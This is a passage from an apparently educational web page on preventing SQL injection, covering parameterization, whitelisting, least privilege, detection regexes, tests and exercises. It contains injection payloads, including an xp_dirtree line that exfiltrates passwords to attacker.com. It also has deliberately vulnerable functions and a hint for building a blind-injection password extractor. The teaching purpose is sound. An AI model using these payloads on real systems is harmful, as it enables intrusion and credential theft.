+    <span class="k">if</span> <span class="n">order</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Sort order must be ASC or DESC&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">order</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Input validation is especially critical for query elements that <strong>cannot</strong> be parameterized, such as table names, column names, and sort directions. These must be validated against whitelists.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Table/column names CANNOT be parameterized — use whitelisting</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">dynamic_sort_query</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">sort_column</span><span class="p">,</span> <span class="n">sort_order</span><span class="p">):</span>
+    <span class="n">column</span> <span class="o">=</span> <span class="n">validate_sort_column</span><span class="p">(</span><span class="n">sort_column</span><span class="p">)</span>
+    <span class="n">order</span> <span class="o">=</span> <span class="n">validate_sort_order</span><span class="p">(</span><span class="n">sort_order</span><span class="p">)</span>
+    <span class="c1"># Safe because values are from a whitelist, not user input</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s2">&quot;SELECT id, username, email FROM users ORDER BY </span><span class="si">{</span><span class="n">column</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">order</span><span class="si">}</span><span class="s2">&quot;</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+</code></pre></div>
+
+<h3>Layer 3: Principle of Least Privilege</h3>
+<p>Your application's database user should have only the permissions it needs:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">-- Create a restricted application user</span>
+<span class="k">CREATE</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="n">app_readonly</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">PASSWORD</span><span class="w"> </span><span class="s1">&#39;secure_password&#39;</span><span class="p">;</span>
+<span class="k">GRANT</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">users</span><span class="p">,</span><span class="w"> </span><span class="n">products</span><span class="p">,</span><span class="w"> </span><span class="n">orders</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="n">app_readonly</span><span class="p">;</span>
+
+<span class="c1">-- Separate user for write operations</span>
+<span class="k">CREATE</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="n">app_writer</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">PASSWORD</span><span class="w"> </span><span class="s1">&#39;another_secure_password&#39;</span><span class="p">;</span>
+<span class="k">GRANT</span><span class="w"> </span><span class="k">SELECT</span><span class="p">,</span><span class="w"> </span><span class="k">INSERT</span><span class="p">,</span><span class="w"> </span><span class="k">UPDATE</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">users</span><span class="p">,</span><span class="w"> </span><span class="n">products</span><span class="p">,</span><span class="w"> </span><span class="n">orders</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="n">app_writer</span><span class="p">;</span>
+<span class="c1">-- Note: no DELETE, no DROP, no access to admin tables</span>
+</code></pre></div>
+
+<p>Even if an attacker achieves injection, they cannot <code>DROP TABLE</code> or access tables outside the granted permissions.</p>
+<h3>Layer 4: Error Handling</h3>
+<p>Never expose database error messages to users. Detailed errors help attackers understand your schema and refine their payloads.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>
+
+<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user_safe</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+            <span class="s2">&quot;SELECT * FROM users WHERE username = </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span>
+            <span class="p">(</span><span class="n">username</span><span class="p">,)</span>
+        <span class="p">)</span>
+        <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="c1"># Log the full error internally</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Database error in get_user: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">exc_info</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="c1"># Return a generic error to the user</span>
+        <span class="k">raise</span> <span class="n">ApplicationError</span><span class="p">(</span><span class="s2">&quot;An internal error occurred. Please try again.&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<h3>Layer 5: Monitoring and Detection</h3>
+<p>Implement monitoring to detect injection attempts:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>
+
+<span class="n">security_logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s1">&#39;security&#39;</span><span class="p">)</span>
+
+<span class="n">SQLI_PATTERNS</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;(&#39;|</span><span class="se">\&quot;</span><span class="s2">)(\s)*(OR|AND)(\s)+(1|true)&quot;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">),</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;UNION(\s)+SELECT&quot;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">),</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;(;)(\s)*(DROP|ALTER|DELETE|UPDATE|INSERT)&quot;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">),</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;(pg_sleep|SLEEP|BENCHMARK|WAITFOR)&quot;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">),</span>
+<span class="p">]</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">check_for_sqli</span><span class="p">(</span><span class="n">user_input</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">field_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">request_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">SQLI_PATTERNS</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">user_input</span><span class="p">):</span>
+            <span class="n">security_logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span>
+                <span class="sa">f</span><span class="s2">&quot;Potential SQLi detected | request_id=</span><span class="si">{</span><span class="n">request_id</span><span class="si">}</span><span class="s2"> &quot;</span>
+                <span class="sa">f</span><span class="s2">&quot;| field=</span><span class="si">{</span><span class="n">field_name</span><span class="si">}</span><span class="s2"> | input=</span><span class="si">{</span><span class="n">user_input</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span>
+            <span class="p">)</span>
+            <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">return</span> <span class="kc">False</span>
+</code></pre></div>
+
+<p>This should not be used as a primary defense (parameterized queries handle that), but rather as an alerting mechanism to identify attackers probing your system.</p>
+<h2>Advanced Attack Vectors to Be Aware Of</h2>
+<h3>Batched (Stacked) Queries</h3>
+<p>Some database drivers allow multiple statements separated by semicolons:</p>
+<div class="highlight"><pre><span></span><code>1; DROP TABLE users; --
+</code></pre></div>
+
+<p>Most modern drivers (including psycopg2 for PostgreSQL) do not allow stacked queries by default with parameterized execution, but raw <code>execute()</code> with string concatenation may permit them depending on configuration.</p>
+<h3>Out-of-Band Extraction</h3>
+<p>In restricted environments where neither results nor timing differences are observable, attackers may use database-specific features to exfiltrate data via DNS or HTTP requests:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">-- SQL Server example</span>
+<span class="k">EXEC</span><span class="w"> </span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\attacker.com\&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">TOP</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;.txt&#39;</span>
+</code></pre></div>
+
+<p>This sends a DNS request containing data to the attacker's server. Defense relies on network-level controls (restrict outbound traffic from DB servers) and, of course, preventing injection in the first place.</p>
+<h3>JSON and NoSQL Injection Variants</h3>
+<p>Modern applications using JSON operators in SQL are also susceptible:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># VULNERABLE — PostgreSQL JSON query</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">search_metadata</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM items WHERE metadata-&gt;&gt;&#39;</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">&#39; = &#39;</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+
+<span class="c1"># SAFE</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">search_metadata_safe</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="n">allowed_keys</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;color&#39;</span><span class="p">,</span> <span class="s1">&#39;size&#39;</span><span class="p">,</span> <span class="s1">&#39;brand&#39;</span><span class="p">}</span>
+    <span class="k">if</span> <span class="n">key</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">allowed_keys</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Invalid metadata key&quot;</span><span class="p">)</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s2">&quot;SELECT * FROM items WHERE metadata-&gt;&gt;&#39;</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">&#39; = %s&quot;</span><span class="p">,</span>
+        <span class="p">(</span><span class="n">value</span><span class="p">,)</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Note that even in the safe version, the <code>key</code> must be whitelisted because JSON field names, like column names, cannot be parameterized.</p>
+<h2>Testing for SQL Injection</h2>
+<p>During development, use these approaches to verify your code is not vulnerable:</p>
+<ol>
+<li><strong>Unit tests with malicious payloads:</strong></li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pytest</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">TestSQLInjectionPrevention</span><span class="p">:</span>
+    <span class="n">MALICIOUS_INPUTS</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s2">&quot;&#39; OR &#39;1&#39;=&#39;1&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;&#39;; DROP TABLE users; --&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;&#39; UNION SELECT username, password FROM users --&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;1 AND (SELECT COUNT(*) FROM users) &gt; 0&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;admin&#39;/*&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;1; WAITFOR DELAY &#39;0:0:5&#39; --&quot;</span><span class="p">,</span>
+    <span class="p">]</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">test_get_user_handles_injection_attempts</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">MALICIOUS_INPUTS</span><span class="p">:</span>
+            <span class="c1"># Should return None, not raise an error or return unexpected data</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">get_user_safe</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+            <span class="k">assert</span> <span class="n">result</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Possible SQLi vulnerability with payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">test_search_does_not_return_all_records</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">search_products_safe</span><span class="p">(</span><span class="s2">&quot;&#39; OR &#39;1&#39;=&#39;1&quot;</span><span class="p">)</span>
+        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>  <span class="c1"># Should match no real category</span>
+</code></pre></div>
+
+<ol>
+<li>
+<p><strong>Static analysis tools:</strong> Use tools like <code>bandit</code> (Python) which detect string formatting in SQL contexts.</p>
+</li>
+<li>
+<p><strong>Dynamic analysis:</strong> Run sqlmap or similar tools against your staging environment to verify WAF rules and application-level defenses.</p>
+</li>
+</ol>
+<h2>Summary of Key Principles</h2>
+<table>
+<thead>
+<tr>
+<th>Principle</th>
+<th>Implementation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Parameterize all queries</td>
+<td>Use <code>%s</code> (psycopg2), <code>:param</code> (SQLAlchemy), <code>%s</code> (Django)</td>
+</tr>
+<tr>
+<td>Whitelist identifiers</td>
+<td>Table names, column names, sort orders must be validated against allowed sets</td>
+</tr>
+<tr>
+<td>Use ORM query builders</td>
+<td>Prefer <code>User.objects.filter()</code> or <code>session.query().filter()</code> over raw SQL</td>
+</tr>
+<tr>
+<td>Least privilege</td>
+<td>Application DB users should only have required permissions</td>
+</tr>
+<tr>
+<td>Suppress error details</td>
+<td>Log internally, show generic messages externally</td>
+</tr>
+<tr>
+<td>Defense in depth</td>
+<td>Combine parameterization + validation + WAF + monitoring + least privilege</td>
+</tr>
+<tr>
+<td>Trust no data</td>
+<td>Even data from your own database may contain payloads (second-order injection)</td>
+</tr>
+</tbody>
+</table>
+<p>SQL injection is a solved problem in the sense that we know exactly how to prevent it. The challenge is discipline: ensuring that every single query path in your application uses the correct patterns, and that code reviews catch the rare instances where someone takes a shortcut. Build secure defaults into your codebase, use linters and static analysis to enforce them, and treat any raw SQL concatenation as a critical security finding.</p>
+        </article>
+        
+
+        
+        <section class="content-section">
+            <h2>Exercises</h2>
+            <ol class="exercise-list">
+                
+                <li>
+                    <div class="exercise-title">Identify and Fix Vulnerable Endpoints</div>
+                    <div class="exercise-desc"><p>You are given the following Flask application with three endpoints. Identify which endpoints are vulnerable to SQL injection and rewrite them to be safe.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">psycopg2</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">psycopg2</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">dbname</span><span class="o">=</span><span class="s1">&#39;store&#39;</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/products&#39;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">list_products</span><span class="p">():</span>
+    <span class="n">category</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;category&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="n">sort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">)</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s2">&quot;SELECT * FROM products WHERE category = &#39;</span><span class="si">{</span><span class="n">category</span><span class="si">}</span><span class="s2">&#39; ORDER BY </span><span class="si">{</span><span class="n">sort</span><span class="si">}</span><span class="s2">&quot;</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;products&#39;</span><span class="p">:</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()}</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/product/&lt;int:product_id&gt;&#39;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_product</span><span class="p">(</span><span class="n">product_id</span><span class="p">):</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="s2">&quot;SELECT * FROM products WHERE id = </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">product_id</span><span class="p">,)</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;product&#39;</span><span class="p">:</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()}</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">search</span><span class="p">():</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="s2">&quot;SELECT * FROM products WHERE name LIKE &#39;</span><span class="si">%%</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">q</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="si">%%</span><span class="s2">&#39;&quot;</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;results&#39;</span><span class="p">:</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()}</span>
+</code></pre></div>
+
+<p>For each vulnerable endpoint, explain the attack vector and provide the corrected code.</p></div>
+                    
+                    <details class="exercise-hint">
+                        <summary>Hint</summary>
+                        <p>The /product endpoint is already safe (parameterized with %s and the route enforces int). The /products endpoint has TWO injection points: the category value and the sort column. The /search endpoint uses string concatenation for a LIKE query. Remember that column names cannot be parameterized — use a whitelist.</p>
+                    </details>
+                    
+                </li>
+                
+                <li>
+                    <div class="exercise-title">Exploit and Defend a Blind Injection</div>
+                    <div class="exercise-desc"><p>Given this vulnerable function:</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">user_exists</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;SELECT 1 FROM users WHERE id = </span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+</code></pre></div>
+
+<ol>
+<li>Write a Python script that exploits this boolean-based blind injection to extract the admin user's password character by character. Assume the function returns True/False and the password column exists in the users table.</li>
+<li>Then rewrite <code>user_exists</code> to be safe against injection.</li>
+<li>Write a unit test that verifies your safe version handles malicious input correctly.</li>
+</ol></div>
+                    
+                    <details class="exercise-hint">
+                        <summary>Hint</summary>
+                        <p>For the exploit, iterate through character positions and for each position try characters a-z, 0-9 by injecting something like: <code>1 AND (SELECT SUBSTRING(password, {pos}, 1) FROM users WHERE username='admin') = '{char}'</code>. For the fix, simply use parameterized queries with %s. For the test, pass SQL injection payloads and assert the function returns False without errors.</p>
+                    </details>
+                    
+                </li>
+                
+                <li>
+                    <div class="exercise-title">Second-Order Injection Scenario</div>
+                    <div class="exercise-desc"><p>Design a complete test scenario demonstrating second-order SQL injection. Create:
+1. A <code>register(username, email)</code> function that safely inserts a user using parameterized queries.
+2. A <code>change_password(username, new_password)</code> function that is vulnerable because it reads the username from the database and uses it in a raw query.
+3. Show the exact sequence of calls an attacker would make to change the admin's password.
+4. Fix the <code>change_password</code> function.
+5. Write an integration test that proves the vulnerability existed and is now fixed.</p></div>
+                    
+                    <details class="exercise-hint">
+                        <summary>Hint</summary>
+                        <p>The attacker registers with a username like <code>admin' --</code>. The INSERT is parameterized so the value is stored literally. When change_password retrieves this username and concatenates it into an UPDATE query, the injection activates and modifies the admin's password instead. The fix is to parameterize the UPDATE query as well.</p>
+                    </details>
+                    
+                </li>
+                
+                <li>
+                    <div class="exercise-title">Build a SQLi Detection Middleware</div>
+                    <div class="exercise-desc"><p>Create a Flask/Django middleware that:
+1. Inspects all incoming request parameters (query string, form data, JSON body) for common SQL injection patterns.
+2. Logs suspicious requests with full context (IP, endpoint, parameter name, matched pattern) to a security log.
+3. Does NOT block requests (to avoid false positives) — only alerts.
+4. Includes at least 10 detection patterns covering UNION, stacked queries, comment injection, time-based payloads, and common tautologies.
+5. Write tests that verify the middleware correctly flags known injection payloads while not flagging legitimate inputs like "O'Brien" or "SELECT" (as a product name).</p>
+<p>Discuss why this middleware should never replace parameterized queries.</p></div>
+                    
+                    <details class="exercise-hint">
+                        <summary>Hint</summary>
+                        <p>Use regex patterns to detect signatures like UNION SELECT, OR 1=1, semicolons followed by DDL/DML keywords, comment sequences (-- or /*), and sleep/benchmark functions. Be careful with patterns that are too broad — 'SELECT' alone in a product name is legitimate. The key insight for the discussion is that detection is inherently a cat-and-mouse game (attackers can encode/obfuscate), while parameterization is a structural guarantee.</p>
+                    </details>
+                    
+                </li>
+                
+            </ol>
+        </section>
+        
+
+        
+        <section class="content-section problems-section">
+            <h2>Common Problems & Solutions</h2>
+            <div class="problems-list">
+                
+                <details class="problem-card">
+                    <summary class="problem-header">
+                        <span class="problem-number">1</span>
+                        <span class="problem-title">ORM queries are still vulnerable to SQL injection despite using an ORM</span>
+                    </summary>
+                    <div class="problem-body">
+                        
+                        <div class="problem-field">
+                            <strong>Symptoms:</strong> Using Django's `extra()`, `raw()`, or SQLAlchemy's `text()` with string formatting results in injection even though the rest of the codebase uses the ORM safely.
+                        </div>
+                        
+                        <div class="problem-field">
+                            <strong>Cause:</strong> ORMs provide escape hatches for raw SQL. When developers use these escape hatches with string concatenation or f-strings instead of parameter binding, the ORM's built-in protections are bypassed entirely.
+                        </div>
+                        <div class="problem-field">
+                            <strong>Solution:</strong> Always pass user input as parameters, even in raw SQL within an ORM. In Django, use `cursor.execute(sql, [params])` or `Model.objects.raw(sql, [params])`. In SQLAlchemy, use `text(sql).bindparams(key=value)` or pass a dict as the second argument to `session.execute()`. Prefer the ORM query builder (e.g., `.filter()`, `.where()`) whenever possible and restrict raw SQL to code-reviewed, parameterized-only usage.
+                        </div>
+                        
+                        <div class="problem-code">
+                            <h1>Django — VULNERABLE</h1>
+<p>User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{name}'")</p>
+<h1>Django — SAFE</h1>
+<p>User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [name])</p>
+<h1>SQLAlchemy — VULNERABLE</h1>
+<p>session.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))</p>
+<h1>SQLAlchemy — SAFE</h1>
+<p>session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})</p>
+                        </div>
+                        
+                    </div>
+                </details>
+                
+                <details class="problem-card">
+                    <summary class="problem-header">
+                        <span class="problem-number">2</span>
+                        <span class="problem-title">Dynamic column names or table names cannot be parameterized, leading to injection</span>
+                    </summary>
+                    <div class="problem-body">
+                        
+                        <div class="problem-field">
+                            <strong>Symptoms:</strong> The application needs to support user-selected sort columns or dynamic table references. Parameterized queries raise errors when used for identifiers (e.g., `psycopg2.errors.SyntaxError` when trying to parameterize a column name).
+                        </div>
+                        
+                        <div class="problem-field">
+                            <strong>Cause:</strong> SQL parameters can only substitute values, not identifiers (table names, column names, schema names). Developers resort to string formatting, which opens injection vectors.
+                        </div>
+                        <div class="problem-field">
+                            <strong>Solution:</strong> Use strict whitelisting for any dynamic identifiers. Map user input to a predefined set of allowed values. For frameworks that support it, use identifier quoting functions (e.g., `psycopg2.sql.Identifier`) which safely escape identifiers.
+                        </div>
+                        
+                        <div class="problem-code">
+                            <p>from psycopg2 import sql</p>
+<p>ALLOWED_SORT_COLUMNS = {'name', 'price', 'created_at', 'rating'}</p>
+<p>def sort_products(cursor, sort_column, sort_dir):
+    if sort_column not in ALLOWED_SORT_COLUMNS:
+        raise ValueError(f"Invalid sort column: {sort_column}")
+    if sort_dir.upper() not in ('ASC', 'DESC'):
+        raise ValueError(f"Invalid sort direction: {sort_dir}")</p>
+<div class="highlight"><pre><span></span><code>query = sql.SQL(&quot;SELECT * FROM products ORDER BY {col} {dir}&quot;).format(
+    col=sql.Identifier(sort_column),
+    dir=sql.SQL(sort_dir.upper())
+)
+cursor.execute(query)
+</code></pre></div>
+                        </div>
+                        
+                    </div>
+                </details>
+                
+                <details class="problem-card">
+                    <summary class="problem-header">
+                        <span class="problem-number">3</span>
+                        <span class="problem-title">IN clause with variable number of parameters is constructed unsafely</span>
+                    </summary>
+                    <div class="problem-body">
+                        
+                        <div class="problem-field">
+                            <strong>Symptoms:</strong> A query with `WHERE id IN (...)` needs to accept a variable-length list. Developers join the values into a comma-separated string and interpolate it, creating an injection vector.
+                        </div>
+                        
+                        <div class="problem-field">
+                            <strong>Cause:</strong> Building `IN (1, 2, 3)` dynamically tempts developers into string concatenation because the number of placeholders varies per request.
+                        </div>
+                        <div class="problem-field">
+                            <strong>Solution:</strong> Generate the correct number of parameter placeholders dynamically, or use database-specific array/tuple features. Most ORMs handle this natively.
+                        </div>
+                        
+                        <div class="problem-code">
+                            <h1>VULNERABLE</h1>
+<p>def get_users_by_ids_unsafe(cursor, id_list):
+    ids = ', '.join(str(i) for i in id_list)  # Trusting input to be ints
+    cursor.execute(f"SELECT * FROM users WHERE id IN ({ids})")</p>
+<h1>SAFE — dynamic placeholders (psycopg2)</h1>
+<p>def get_users_by_ids_safe(cursor, id_list):
+    placeholders = ', '.join(['%s'] * len(id_list))
+    cursor.execute(
+        f"SELECT * FROM users WHERE id IN ({placeholders})",
+        tuple(id_list)
+    )</p>
+<h1>SAFE — using psycopg2's tuple adaptation</h1>
+<p>def get_users_by_ids_tuple(cursor, id_list):
+    cursor.execute(
+        "SELECT * FROM users WHERE id = ANY(%s)",
+        (list(id_list),)
+    )</p>
+<h1>SAFE — Django ORM (handles it automatically)</h1>
+<p>User.objects.filter(id__in=id_list)</p>
+                        </div>
+                        
+                    </div>
+                </details>
+                
+            </div>
+        </section>
+        
+
+        
+        <section class="content-section">
+            <h2>Further Reading</h2>
+            <div class="resource-list">
+                
+                <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" class="resource-card">
+                    <div class="resource-type-tag docs">docs</div>
+                    <div class="resource-title">OWASP SQL Injection Prevention Cheat Sheet</div>
+                    
